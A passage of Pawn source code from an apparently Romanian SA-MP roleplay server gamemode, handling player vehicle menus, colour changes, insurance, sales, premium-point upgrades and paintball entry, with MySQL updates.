				if(PlayerInfo[playerid][pHidden] == 0) return SendClientMessage(playerid, -1, "Nu ai o culoare hidden, pentru a cumpara una '/shop'.");
				SendClientMessage(playerid, COLOR_GOLD, "Ti-ai schimbat culoarea in una hidden!");	
				PlayerInfo[playerid][pHidden] --;
				UpdateVar(playerid, "Hidden", PlayerInfo[playerid][pHidden]);
			}
			if(color < 0 || color > 255) return SendClientMessage(playerid, -1, "Culori invalide!");
			SendClientMessage(playerid, COLOR_MONEY, "Ti-ai schimbat culorea la vehicul pentru $50,000.");
			CarInfo[idd][cColorOne] = color;
			ChangeVehicleColorEx(car, color, CarInfo[idd][cColorTwo]);
			mysql_format(SQL, string, sizeof(string), "UPDATE cars SET ColorOne = %d WHERE ID=%d", color, CarInfo[idd][cID]);
			mysql_tquery(SQL, string, "", "");			
		}
		case 2: {
			if(color < 0 || color > 255) return SendClientMessage(playerid, -1, "Culori invalide!");
			if(color > 127) {
				if(PlayerInfo[playerid][pHidden] == 0) return SendClientMessage(playerid, -1, "Nu ai o culoare hidden, pentru a cumpara una '/shop'.");
				SendClientMessage(playerid, COLOR_GOLD, "Ti-ai schimbat culoarea in una hidden!");	
				PlayerInfo[playerid][pHidden] --;
				UpdateVar(playerid, "Hidden", PlayerInfo[playerid][pHidden]);
			}
			else SendClientMessage(playerid, COLOR_MONEY, "Ti-ai schimbat culorea la vehicul pentru $50,000.");
			CarInfo[idd][cColorTwo] = color;
			ChangeVehicleColorEx(car, CarInfo[idd][cColorOne], color);
			mysql_format(SQL, string, sizeof(string), "UPDATE cars SET ColorTwo = %d WHERE ID=%d", color, CarInfo[idd][cID]);
			mysql_tquery(SQL, string, "", "");						
		}
	}
	
	
	GivePlayerCash(playerid, -50000);
	BizzInfo[BizzTypeID[13][0]][bBalance] += 50000;
	return true;
}
stock LockCarFunction(playerid,engine=0,lights=0,alarm=0,doors=0,bonnet=0,boot=0,objective=0) {
	new car = IsPlayerInAnyVehicle(playerid) ? GetPlayerVehicleID(playerid) : GetClosestVehicle(playerid);
	if(!IsPlayerNearVehicle(playerid, car) || !Iter_Contains(PlayerKeys[playerid], car)) return true;

	GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
	SetVehicleParamsEx(car,engine,lights,alarm,!doors,bonnet,boot,objective);
	format(gString, 84, "~w~%s~n~%s",GetVehicleName(GetVehicleModel(car)), !doors?("~r~inchis"):("~g~deschis"));
	GameTextForPlayer(playerid, gString, 5000, 4);
	return true;
}
stock IsPlayerNearVehicle(const playerid, const vehicleid, const Float:range = 5.0, Float:x=0.0,Float:y=0.0,Float:z=0.0)
	return GetVehiclePos(vehicleid,x,y,z)&IsPlayerInRangeOfPoint(playerid,range,x,y,z);

cmd:enter(playerid) {
	showPaintball(playerid);
	showRace(playerid);
	return true;
}

stock showPaintball(playerid) {
	if(IsPlayerInRangeOfPoint(playerid,2,BizzInfo[BizzTypeID[14][0]][bEntranceX], BizzInfo[BizzTypeID[14][0]][bEntranceY], BizzInfo[BizzTypeID[14][0]][bEntranceZ]) && BizzInfo[BizzTypeID[14][0]][bStatic] == 1) {
		if(OnDuty[playerid]) 
			return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti intra la paint pentru ca esti duty!");
		
		if(InWarTurf[PlayerInfo[playerid][pMember]]!=-1) 
			return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti intra intr-o afacere in timpul war-ului!");
		
		if(GetPlayerCash(playerid) < BizzInfo[22][bFee]) 
			return GameTextForPlayer(playerid, "~r~~h~Nu ai destui bani", 1000, 1);
	    
	    if(OnDuty[playerid] == 1 || PlayerHit[playerid] != -1) { }
		else if(BizzInfo[BizzTypeID[14][0]][bLocked] == 1) 
			return GameTextForPlayer(playerid, "~r~~h~Inchis", 1000, 1);
		
		if(PlayerInfo[playerid][pWantedLevel] > 0) 
			return SendClientMessage(playerid, -1, "Ai wanted, nu poti intra!");

		if(PlayerInfo[playerid][pLevel] < 7 && PlayerInfo[playerid][pGunLic] == 0 && PlayerInfo[playerid][pConnectTime] < 15)
			return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de minim level 7, o licenta de arme si 15 ore jucate pentru a intra la paintball!");
		
		gString[0] = (EOS);
		strcat(gString, "Mode\tPlayers\tMap\tStatus\n");
		if(PaintTime[0] > 0) format(gQuery, 128, "Clasic\t%d/20\t%s\t{9ACD32}%02d:%02d (started)\n", PlayersOnPaint(0), MapName(0), PaintTime[0]/60, PaintTime[0]%60);
		else format(gQuery, 144, "Classic\t%d/20\t%s\t{FFFF00}waiting..\n", PlayersOnPaint(0), MapName(0));
		strcat(gString, gQuery);
		if(PaintTime[1] > 0) format(gQuery, 128, "Deagle Only\t%d/20\t%s\t{9ACD32}%02d:%02d (started)\n", PlayersOnPaint(1), MapName(1), PaintTime[1]/60, PaintTime[1]%60);
		else format(gQuery, 144, "Deagle Only\t%d/20\t%s\t{FFFF00}waiting..\n", PlayersOnPaint(1), MapName(1));
		strcat(gString, gQuery);
		DeelayCommand[playerid][9] = gettime()+10;
		ShowPlayerDialog(playerid, DIALOG_MODE, DIALOG_STYLE_TABLIST_HEADERS, "Paintball:", gString, "Ok", "Exit");								
	}
	return true;
}
redist::UpdateSlots(playerid) {
	gQuery[0] = EOS;
	mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `users` SET `Slot`='%d' WHERE `id`='%d'", PlayerInfo[playerid][pSlot], PlayerInfo[playerid][pSQLID]);
	mysql_tquery(SQL, gQuery, "", "");
	return true;
}

cmd:v(playerid, params[]) return ShowPlayerVehicle(playerid);
cmd:cv(playerid, params[]) return PlayerInfo[playerid][pClan]?ShowPlayerClanVehicle(playerid):1;

cmd:neon(playerid, params[]) {
    #pragma unused params
	if((PersonalCar(playerid)) == -1) return SendErrorMsg(playerid, "Nu esti intr-un vehicul personal!");
	if(!CarInfo[PersonalCar(playerid)][cSNeon]) return SendErrorMsg(playerid, "Ai nevoie de special neon!");
	return ShowPlayerDialog(playerid, DIALOG_CHANGENEON, DIALOG_STYLE_LIST, "{F4AD42}Neon {FFFFFF}Menu", "Change left neon\nChange right neon\n{FF0000}Reset to default", "Select", "Cancel");
}

stock CheckDespawnCar(carid) {
	new x[15] = {"none"};
	if(CarInfo[carid][cTime]) format(x, 15, "%02d:%02d", CarInfo[carid][cTime]/60, CarInfo[carid][cTime]%60);
	return x;
}

stock CheckCarplateCar(carid) {
	new x[35] = {""};
	if(CarInfo[carid][cCustomLicense] && strlen(CarInfo[carid][cLicenseColor]) >= 5) format(x, 35, "[{%s}%s{FFFFFF}]", CarInfo[carid][cLicenseColor], CarInfo[carid][cLicense]);
	else if(CarInfo[carid][cCustomLicense]) format(x, 15, "[%s]", CarInfo[carid][cLicense]);
	return x;
}

stock ShowPlayerVehicle(playerid, x=-1) {
	if(!Iter_Count(MyVehicle<playerid>)) return SendErrorMsg(playerid, "Nu ai un vehicul personal!");
	
	gString = "Vehicle\tStatus\tDespawn Time\tOther details\n";
	foreach(new car : MyVehicle<playerid>) {
		format(gQuery, 128, "%s %s\t%s\t%s\t%s\n", 
			GetVehicleName(CarInfo[car][cModel]), CheckCarplateCar(car), 
			CarInfo[car][Spawned] != 0 ? IsVehicleOccupied(CarInfo[car][Spawned]) ? ("{F3C13A}[occupied]") : CarInfo[car][cGarage] != -1 && GetVehicleVirtualWorld(CarInfo[car][Spawned]) ? ("{FF0000}[in garage]") : ("{26B309}[spawned]") : ("{FF0000}[despawned]"), 
			CheckDespawnCar(car), 
			TotalUp(car)); 

		strcat(gString, gQuery);
		PlayerInfo[playerid][pCarKey][++x] = car;
	}
	return ShowPlayerDialogPages(playerid, DIALOG_GARAGE, DIALOG_STYLE_TABLIST_HEADERS, "Your Vehicles - Page #currentpage/#pagelist", gString, "Select", "Cancel", 10, "{ffca60}>> Next page", "{ffca60}<< Back Page", true);
}

Dialog:personal_vehicles(playerid, response, listitem, inputtext[])
{
    if(!response) return true;
	new idd = PlayerInfo[playerid][pCarKey][listitem]; gString[0] = (EOS);
	listitemm[playerid] = idd;
	strcat(gString, "Vehicle Info\n");
	if(CarInfo[idd][Spawned] != 0) strcat(gString,"Despawn Vehicle\n");
	else strcat(gString,"Spawn Vehicle\n");
	strcat(gString, "Tow Vehicle\n");
	strcat(gString, "Find Vehicle\n"); 
	strcat(gString, "Buy Insurance\n");
	strcat(gString, "Unstuck Vehicle\n"); 
	strcat(gString, "Sell Vehicle\n");
	strcat(gString, !CarInfo[idd][cVip] ? "Upgrade to VIP Plus ({F7CA18}500 premium points{FFFFFF})\n" : "{FF0000}>> {FFFFFF}Teleport Vehicle\n");
	strcat(gString, "Upgrade to VIP Vehicle ({F7CA18}300 premium points{FFFFFF})\n");
	strcat(gString, "Upgrade to Rainbow Vehicle ({F7CA18}300 premium points{FFFFFF})\n");
	strcat(gString, "Reset KM ({F7CA18}200 premium points{FFFFFF})\n");
	strcat(gString, "Reset Days ({F7CA18}100 premium points{FFFFFF})\n");
	strcat(gString, "{FF0000}Remove tuning");
	if(CarInfo[idd][Confiscated]) strcat(gString, "\n{FFFFFF}Pay fine to TTC");
	Dialog_Show(playerid, personal_vehicles_op, DIALOG_STYLE_LIST, "Options", gString, "Select", "Back");
    return 1;
}


Dialog:personal_vehicles_op(playerid, response, listitem, inputtext[]) {
	if(!response) return true;
	new vsid = listitemm[playerid];
	switch(listitem) {
		case 0: ShowCarInfo(playerid, vsid);
		case 1: {
			if(!CarInfo[vsid][Spawned]) {	
				if(CarInfo[vsid][Confiscated]) return SendErrorMsg(playerid, "Acest vehicul este confiscat deoarece a fost parcat neregulamentar! Plateste amenda (ultimul rand din meniu).");	
				if(MyVehicleSpawn[playerid] >= (!PlayerInfo[playerid][pReborn] ? 4 : 6)) return SendErrorMsg(playerid, !PlayerInfo[playerid][pReborn] ? "Poti avea doar 4 masini spawnate." : "Poti avea doar 6 masini spawnate.");
				SpawnPlayerCar(playerid, vsid);
				va_SendClientMessage(playerid, COLOR_CLIENT, "Your %s has been spawned.", GetVehicleName(CarInfo[vsid][cModel]));					
			}
			else {
				if(IsAttached(CarInfo[vsid][Spawned])) return SendErrorMsg(playerid, "Nu poti folosi aceasta functie momentan!");
				if(IsVehicleOccupied(CarInfo[vsid][Spawned])) return SendErrorMsg(playerid, "Vehiculul tau este ocupat!");
				DestroyPlayerCar(vsid);			
				va_SendClientMessage(playerid, COLOR_CLIENT, "Your %s has been despawned.", GetVehicleName(CarInfo[vsid][cModel]));					
			}
		}
		case 2: {			
			if(GetPlayerCash(playerid) < 5000) return SendErrorMsg(playerid, "Nu ai $5000!");
			if(!CarInfo[vsid][Spawned]) return SendErrorMsg(playerid, "Vehiculul tau nu este spawnat!");
			if(IsVehicleOccupied(CarInfo[vsid][Spawned])) return SendErrorMsg(playerid, "Vehiculul tau este ocupat!");
			if(CarInfo[vsid][Confiscated]) return SendErrorMsg(playerid, "Acest vehicul este confiscat deoarece a fost parcat neregulamentar! Plateste amenda (ultimul rand din meniu).");
			if(IsAttached(CarInfo[vsid][Spawned])) return SendErrorMsg(playerid, "Nu poti folosi aceasta functie momentan!");
            
			CarInfo[vsid][cTime] = 600;
			SetVehicleToRespawn(CarInfo[vsid][Spawned]);
			SetVehicleHealth(CarInfo[vsid][Spawned], CarInfo[vsid][cVip] ? 2000 : 1000);
			SetTunning(vsid);
			GivePlayerCash(playerid, -5000);
			va_SendClientMessage(playerid, COLOR_CLIENT, "Your %s has been respawned.", GetVehicleName(CarInfo[vsid][cModel]));
		}
		case 3: { 
			if(!CarInfo[vsid][Spawned]) return SendErrorMsg(playerid, "Vehiculul tau nu este spawnat!");
			if(CP[playerid] != 0) return Dialog_Show(playerid, checkpoint_active, DIALOG_STYLE_MSGBOX, "Checkpoint", "Ai deja un checkpoint activ.\nDoresti sa-l anulezi? Daca da, apasa pe 'Ok'.", "Ok", "Exit");
			
			new Float:vehx, Float:vehy, Float:vehz;
			GetVehiclePos(CarInfo[vsid][Spawned], vehx, vehy, vehz);
			SetPlayerCheckpoint(playerid, vehx, vehy, vehz, 3.0);
			va_SendClientMessage(playerid, COLOR_YELLOW, "Mergi la punctul rosu de pe minimap pentru a ajunge la masina ta. Distanta: %0.2fm.", GetPlayerDistanceFromPoint(playerid, vehx, vehy, vehz));
			CP[playerid] = 53;
		}	
		case 4: {
			format(gString, 128, "Insurance price: $%d / insurance point.\n\nBuy insurance point (maximum 3):", CarInfo[vsid][cTax]);
			Dialog_Show(playerid, insurance_vehicle, DIALOG_STYLE_INPUT, "Buy Insurance", gString, "Buy", "Cancel");				
		}
		case 5: {
			if(!CarInfo[vsid][Spawned]) return SendErrorMsg(playerid, "Vehiculul tau nu este spawnat!");
			if(IsAttached(CarInfo[vsid][Spawned])) return SendErrorMsg(playerid, "Nu poti folosi aceasta functie momentan!");
			if(IsVehicleOccupied(CarInfo[vsid][Spawned])) return SendErrorMsg(playerid, "Vehiculul tau este ocupat!");
			if(CP[playerid] != 0) return Dialog_Show(playerid, checkpoint_active, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Do you want to cancel your current checkpoint?", "Yes", "No");
			
			CP[playerid] = 53;
			SendClientMessage(playerid, COLOR_YELLOW, "Checkpoint marked at the location.");
			if(IsAFLYCar(CarInfo[vsid][Spawned])) {
				SetVehiclePosEx(CarInfo[vsid][Spawned], -1649.1798, -159.0667, 17.3618);
				SetVehicleZAngleEx(CarInfo[vsid][Spawned], -44.1000);
		        new randspawn = random(sizeof(HeliVehPos));
				SetVehiclePosEx(CarInfo[vsid][Spawned], HeliVehPos[randspawn][0], HeliVehPos[randspawn][1], HeliVehPos[randspawn][2]);
				SetVehicleZAngleEx(CarInfo[vsid][Spawned], 44.4000);
				SetPlayerCheckpoint(playerid, HeliVehPos[randspawn][0], HeliVehPos[randspawn][1], HeliVehPos[randspawn][2], 5.0);
				return true;
			}
			else if(IsABOATCar(CarInfo[vsid][Spawned])) {
		        new randspawn = random(sizeof(BoatVehPos));
				SetVehiclePosEx(CarInfo[vsid][Spawned], BoatVehPos[randspawn][0], BoatVehPos[randspawn][1], BoatVehPos[randspawn][2]);
				SetVehicleZAngleEx(CarInfo[vsid][Spawned], -173.4001);
				SetPlayerCheckpoint(playerid, BoatVehPos[randspawn][0], BoatVehPos[randspawn][1], BoatVehPos[randspawn][2], 5.0);
				return true;
			}
			else {
		        new randspawn = random(sizeof(DealerCarPos));
				SetVehiclePosEx(CarInfo[vsid][Spawned], DealerCarPos[randspawn][0], DealerCarPos[randspawn][1], DealerCarPos[randspawn][2]);
				SetVehicleZAngleEx(CarInfo[vsid][Spawned], -173.4001);
				SetPlayerCheckpoint(playerid, DealerCarPos[randspawn][0], DealerCarPos[randspawn][1], DealerCarPos[randspawn][2], 5.0);
				return true;
			}
		}
		case 6: {
			if(TradeID[playerid] != -1) return SendErrorMsg(playerid, "Nu poti folosi aceasta comanda atata timp cat esti implicat intr-o afacere!");
			if(!CarInfo[vsid][Spawned]) return SendErrorMsg(playerid, "Vehiculul tau nu este spawnat!");
			if(!PlayerToPoint(10, playerid, 2131.7717,-1151.3202,24.0600)) return SendErrorMsg(playerid, "Trebuie sa fii la dealership. Foloseste /gps pentru a afla unde este.");
            if(IsAttached(CarInfo[vsid][Spawned])) return SendErrorMsg(playerid, "Nu poti folosi aceasta functie momentan!");
            if(GetPlayerVehicleID(playerid) != CarInfo[vsid][Spawned]) return SendErrorMsg(playerid, "Trebuie sa fi in acel vehicul!");

			format(gString, 128, "Esti sigur ca vrei sa-ti vinzi %s pentru $%s?",aVehicleNames[CarInfo[vsid][cModel]-400],FormatNumber(CarInfo[vsid][cValue] / 2));
			Dialog_Show(playerid, sellcar_vehicle, DIALOG_STYLE_MSGBOX, "Dealership", gString, "Da", "Nu");
			PlayerSellCar[playerid] = vsid;
			if(CP[playerid] == 43 || CP[playerid] == 53) { CP[playerid] = 0; DisablePlayerCheckpointEx(playerid); }
		}
		case 7: {
			switch(CarInfo[vsid][cVip]) {
				case 0: {
					if(CarInfo[vsid][cVip])
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acest vehicul are deja upgrade-ul VIP PLUS.");
					if(strlen(CarInfo[vsid][cText]) < 3) 
						return SendClientMessage(playerid, -1, "Pentru a upgrada la 'VIP Plus Vehicle' trebuie mai intai ca vehiculul sa aiba optiunea 'VIP'!");
					if(PlayerInfo[playerid][pPremiumPoints] < 500) 
						return Dialog_Show(playerid, invalid, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
					Dialog_Show(playerid, upgrade_vp_vehicle, DIALOG_STYLE_MSGBOX, "Upgrade to VIP PLUS Vehicle", "Esti sigur ca vrei sa faci acest upgrade? (500PP)\n\nAvantaje:\n-Vehiculul are 2000HP.\n-Posibilitatea de a aduce vehiculul la tine odata pe ora.", "Da", "Nu");
				}
				case 1: {
					if(CarInfo[vsid][Spawned] == 0) 
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Vehiculul tau nu este spawnat!");
					if(IsVehicleOccupied(CarInfo[vsid][Spawned])) 
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Vehiculul tau este ocupat!");
					if(gettime() < CarInfo[vsid][cTimeGoto])
						return SCMf(playerid, COLOR_LGREEN, "You can't use this option for %d minutes and %d seconds.", (CarInfo[vsid][cTimeGoto]-gettime())/60, (CarInfo[vsid][cTimeGoto]-gettime())%60);
					
					if(IsAttached(CarInfo[vsid][Spawned])) 
                  		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta functie momentan!");
                  	if(GetPlayerVirtualWorld(playerid) != 0 || GetPlayerInterior(playerid) != 0) 
                  		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta optiune intr-un VW / Interior diferit de 0.");
					new Float: X, Float: Y, Float: Z;
					GetPlayerPos(playerid, X, Y, Z);
					SetVehiclePosEx(CarInfo[vsid][Spawned], X, Y+4, Z);
					SetVehicleVirtualWorld(CarInfo[vsid][Spawned], GetPlayerVirtualWorld(playerid));
					LinkVehicleToInterior(CarInfo[vsid][Spawned], GetPlayerInterior(playerid));
					SendClientMessage(playerid, COLOR_MONEY, "(VIP Plus) {FFFFFF}You called the mechanic, please wait..");
					CarInfo[vsid][cTimeGoto] = gettime()+(PlayerInfo[playerid][pVip]!=3?900:450);
					gQuery[0] = EOS;
					mysql_format(SQL, gQuery, 500, "UPDATE `cars` SET `TimeGoto`='%d' WHERE `ID`='%d'", CarInfo[vsid][cTimeGoto], CarInfo[vsid][cID]);
					mysql_tquery(SQL, gQuery, "", "");
				}
			}
		}
		case 8: {
			if(CarInfo[vsid][Spawned] == 0) 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Vehiculul tau nu este spawnat!");
			if(strlen(CarInfo[vsid][cText]) >= 3) 
				return SendClientMessage(playerid, -1, "Acest vehicul este deja unul VIP!");
			
			if(PlayerInfo[playerid][pPremiumPoints] < 300) 
				return Dialog_Show(playerid, invalid, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
			
			Dialog_Show(playerid, upgrade_veh_vip, DIALOG_STYLE_MSGBOX, "Upgrade to VIP Vehicle", "Esti sigur ca vrei sa faci acest lucru?\nVei pierde 300 puncte premium.", "Da", "Nu");
		}
		case 9: {
			if(CarInfo[vsid][Spawned] == 0) 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Vehiculul tau nu este spawnat!");
			if(CarInfo[vsid][cRainBow]) 
				return SendClientMessage(playerid, -1, "Acest vehicul este deja unul RainBow!");
			if(PlayerInfo[playerid][pPremiumPoints] < 300) 
				return Dialog_Show(playerid, invalid, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
			Dialog_Show(playerid, upgrade_rainbow_vehicle, DIALOG_STYLE_MSGBOX, "Upgrade to RainBow", "Are you sure you want to do this? \nIt lose 300 Premium Points.", "Upgrade", "Cancel");
		}
		case 10: {
			if(!CarInfo[vsid][Spawned]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Vehiculul tau nu este spawnat!");
			if(PlayerInfo[playerid][pPremiumPoints] < 200) return Dialog_Show(playerid, invalid, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
			Dialog_Show(playerid, resetkm_vehicle, DIALOG_STYLE_MSGBOX, "{ffff00}Reset KM", "Esti sigur ca vrei sa faci acest lucru?\nVei pierde 200 puncte premium.", "Da", "Nu");
		}
		case 11: {
			if(!CarInfo[vsid][Spawned]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Vehiculul tau nu este spawnat!");
			if(PlayerInfo[playerid][pPremiumPoints] < 200) return Dialog_Show(playerid, invalid, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
			Dialog_Show(playerid, resetdays_vehicle, DIALOG_STYLE_MSGBOX, "{ffff00}Reset Days", "Esti sigur ca vrei sa faci acest lucru?\nVei pierde 200 puncte premium.", "Da", "Nu");
		}
		case 12: {
			if(CarInfo[vsid][Spawned] == 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Vehiculul tau nu este spawnat!");
			new car = CarInfo[vsid][Spawned];
			for(new i = 0; i < 14; i++) {
				if(CarInfo[vsid][cMod][i] != 0) RemoveVehicleComponent(car, CarInfo[vsid][cMod][i]);
				CarInfo[vsid][cMod][i] = 0;
			}
			CarInfo[vsid][paintjob] = 3;
			ChangeVehiclePaintjob(CarInfo[vsid][Spawned], 3);
			gString[0] = (EOS);
			mysql_format(SQL, gString, 128, "UPDATE `cars` SET `Mods`='%i %i %i %i %i %i %i %i %i %i %i %i %i %i' WHERE `ID`='%i'", CarInfo[vsid][cMod][0], CarInfo[vsid][cMod][1], CarInfo[vsid][cMod][2],
				CarInfo[vsid][cMod][3], CarInfo[vsid][cMod][4], CarInfo[vsid][cMod][5], CarInfo[vsid][cMod][6], CarInfo[vsid][cMod][7], CarInfo[vsid][cMod][8], CarInfo[vsid][cMod][9],
				CarInfo[vsid][cMod][10], CarInfo[vsid][cMod][11], CarInfo[vsid][cMod][12], CarInfo[vsid][cMod][13], CarInfo[vsid][cID]);
			mysql_tquery(SQL, gString);
			mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `cars` SET `paintjob`='%d' WHERE `ID`='%d'",CarInfo[vsid][paintjob], CarInfo[vsid][cID]);
			mysql_tquery(SQL, gQuery, "", "");		
			SendClientMessage(playerid, COLOR_YELLOW, "Tuning was successfully deleted!");			
		}
		case 13: {
			if(!CarInfo[vsid][Confiscated]) return true;
			if(GetPlayerCash(playerid) < 5000000) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de $5.000.000 pentru a plati amenda!");
			Dialog_Show(playerid, pay_tax_vehicle, DIALOG_STYLE_MSGBOX, "Plateste amenda","Esti sigur ca vrei sa platesti amenda pentru parcarea neregulamentara?\nDaca consideri ca a fost luata aiurea, cere o dovada pe forum.", "Da", "Nu");
		}				
	}					
	return 1;
}

Dialog:upgrade_veh_vip(playerid, response, listitem, inputtext[]) {
	if(!response) return true;
	new string[256];
	new idd = listitemm[playerid];
	if(CarInfo[idd][Spawned] == 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Vehiculul tau nu este spawnat!");
	//if(valid_vip_vehicle(CarInfo[idd][cModel]) == 0) return SendClientMessage(playerid, COLOR_GREY, "Acest vehicul nu poate fi upgradat!");
	if(strlen(CarInfo[idd][cText]) >= 3) return SendClientMessage(playerid, -1, "Acest vehicul este deja unul VIP!");
	if(PlayerInfo[playerid][pPremiumPoints] < 300) return SendClientMessage(playerid, -1, "Nu ai destule Premium Points.");
	PlayerInfo[playerid][pPremiumPoints] -= 300;
	UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
	SendClientMessage(playerid, COLOR_YELLOW, "* Felicitari! Ti-ai upgradat cu succes vehiculul la unul VIP.");
	format(string, sizeof(string), "%s si-a upgradat vehiculul %s[id: %d] la unul VIP pentru 300 Premium Points.", GetName(playerid), aVehicleNames[CarInfo[idd][cModel]-400], idd);
	InsertLog(playerid, string, LOG_SHOP);				
	mysql_format(SQL, string, sizeof(string), "UPDATE `cars` SET `Text`='%s' WHERE `ID`='%d'", GetName(playerid), CarInfo[idd][cID]);
	mysql_tquery(SQL, string, "", "");
	CarInfo[idd][cVipPos][0]=CarInfo[idd][cVipPos][1]=CarInfo[idd][cVipPos][2]=CarInfo[idd][cVipPos][3]=CarInfo[idd][cVipPos][4]=CarInfo[idd][cVipPos][5]=0.0;
	switch(CarInfo[idd][cModel]) {
		case 411: CarInfo[idd][cVipPos][1] = -1.9, CarInfo[idd][cVipPos][2] = 0.3, CarInfo[idd][cVipPos][3] = 270.0;
		case 560: CarInfo[idd][cVipPos][1] = -0.6, CarInfo[idd][cVipPos][2] = 0.8, CarInfo[idd][cVipPos][3] = 270.0;
		case 541: CarInfo[idd][cVipPos][1] = -0.4, CarInfo[idd][cVipPos][2] = 0.59, CarInfo[idd][cVipPos][3] = 270.0;
		case 429: CarInfo[idd][cVipPos][1] = -1.79, CarInfo[idd][cVipPos][2] = 0.33, CarInfo[idd][cVipPos][3] = 270.0;
		case 495: CarInfo[idd][cVipPos][1] = -1.2, CarInfo[idd][cVipPos][2] = 1, CarInfo[idd][cVipPos][3] = 270.0;
		case 579: CarInfo[idd][cVipPos][1] = -2, CarInfo[idd][cVipPos][2] = 1.21,CarInfo[idd][cVipPos][3] = 270.0;
		case 562: CarInfo[idd][cVipPos][1] = -0.69, CarInfo[idd][cVipPos][2] = 0.76, CarInfo[idd][cVipPos][3] = 270.0;
		case 451: CarInfo[idd][cVipPos][1] = -0.6, CarInfo[idd][cVipPos][2] = 0.56, CarInfo[idd][cVipPos][3] = 270.0;
		case 480: CarInfo[idd][cVipPos][1] = -1.58, CarInfo[idd][cVipPos][2] = 0.27, CarInfo[idd][cVipPos][3] = 270.0;
	}
	format(CarInfo[idd][cText], 32, GetName(playerid));
	attach_vip_text(idd);
	finishAchievement(playerid, 28);
	return 1;
}

Dialog:checkpoint_active(playerid, response, listitem, inputtext[]) {
	if(!response) return true;
	if(InExamen[playerid]) 
		FailExamen(playerid);
	if p_rob[playerid][r_coPlayer]!=-1 *then return stop_rob(playerid, 4);
	DisablePlayerRaceCheckpointEx(playerid);
	targetfind[playerid] = -1;
	CP[playerid] = 0;
	UsedFind[playerid] = 0;		

	DisablePlayerCheckpointEx(playerid);
	SendClientMessage(playerid,COLOR_WHITE,"Punctul rosu a fost sters cu succes.");
	PlayerTextDrawHide(playerid, FindTD);
	PlayerTextDrawHide(playerid, FindSkinTD);
	DisablePlayerCheckpointEx(playerid);	
	if(JobWorking[playerid] == 1) stopWork(playerid);
	return 1;
}

Dialog:insurance_vehicle(playerid, response, listitem, inputtext[]) {
	if(!response) return true;
	new vsid = listitemm[playerid], points = strval(inputtext);
	if(points + CarInfo[vsid][cPoints] > 5 || points < 1) 
		return SendClientMessage(playerid, COLOR_GREY, "Nu poti avea mai mult de 5 puncte de asigurare!");
	if(GetPlayerCash(playerid) < CarInfo[vsid][cTax]*points)
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai suma necesara pentru a cumpara puncte de asigurare!");
	CarInfo[vsid][cPoints] += points;
	SCMf(playerid, COLOR_MONEY, "Ai platit $%s pentru %d puncte asigurare.", FormatNumber(CarInfo[vsid][cTax]*points), points);
	GivePlayerCash(playerid, -CarInfo[vsid][cTax]*points);
	mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `cars` SET `Points`='%d' WHERE `ID`='%d'", CarInfo[vsid][cPoints], CarInfo[vsid][cID]);
	mysql_tquery(SQL, gQuery, "", "");
	return 1;
}

Dialog:sellcar_vehicle(playerid, response, listitem, inputtext[]) {
	if(!response) return true;
	new vsid = PlayerSellCar[playerid];
	if(CarInfo[vsid][Spawned] == 0) return true;
				
	new value = CarInfo[vsid][cValue] / 2;
	GivePlayerCash(playerid, value);
	format(gString, sizeof(gString), "Ai primit $%s pentru ca ti-ai vandut vehiculul!",FormatNumber(value), "%%");
	SendClientMessage(playerid,COLOR_MONEY,gString);
				
	format(gString, sizeof(gString), "%s si-a vandut vehiculul %s[%d] (la stat) si a primit $%s.", GetName(playerid), aVehicleNames[CarInfo[vsid][cModel]-400], vsid, FormatNumber(value));
	SendAdminMessage(COLOR_YELLOW, gString, 1); 
	InsertLog(playerid, gString, LOG_SELL);	
	DestroyPlayerCar(vsid);
	Iter_Remove(MyVehicle<playerid>, vsid);
	mysql_format(SQL, gQuery, sizeof(gQuery), "DELETE FROM `cars` WHERE `ID`='%d' LIMIT 1", CarInfo[vsid][cID]);
	mysql_tquery(SQL, gQuery, "", "");		
	return 1;
}

Dialog:upgrade_vp_vehicle(playerid, response, listitem, inputtext[]) {
	if(!response) return true;
	new idd = listitemm[playerid];
	if(CarInfo[idd][cVip]) 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai deja upgradat la VIP Plus.");
	if(CarInfo[idd][Spawned] == 0) 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Vehiculul tau nu este spawnat!");
	if(strlen(CarInfo[idd][cText]) < 3) 
		return SendClientMessage(playerid, -1, "Mai intai ai nevoie de upgrade-ul 'VIP' pentru a putea upgrada la 'VIP PLUS'.");
	if(PlayerInfo[playerid][pPremiumPoints] < 500) 
		return SendClientMessage(playerid, -1, "Nu ai destule Premium Points.");
	PlayerInfo[playerid][pPremiumPoints] -= 500;
	UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
